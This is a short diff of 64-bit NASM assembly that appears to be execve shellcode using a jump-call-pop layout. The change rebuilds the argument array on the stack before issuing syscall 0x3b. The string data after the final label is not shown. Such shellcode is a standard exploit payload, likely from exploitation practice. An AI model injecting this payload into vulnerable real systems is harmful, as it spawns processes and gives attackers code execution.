@@ -1,11 +1,17 @@
 BITS 64
 jmp short jukebox
 shellcode:
-	xor    rax, rax
-	mov    al, 0x3b
 	pop    rdi
-	mov    rdx, rdi
-	push   rdx
+	mov    rbp, rsp
+	push 0
+	add rdi, 10
+	push rdi
+	sub rdi, 10
+	push rdi
+	xor    rax, rax
+	xor    rdx, rdx
+	mov    al, 0x3b
+	mov    rdi, qword [rsp]
 	mov    rsi, rsp
 	syscall
 jukebox:
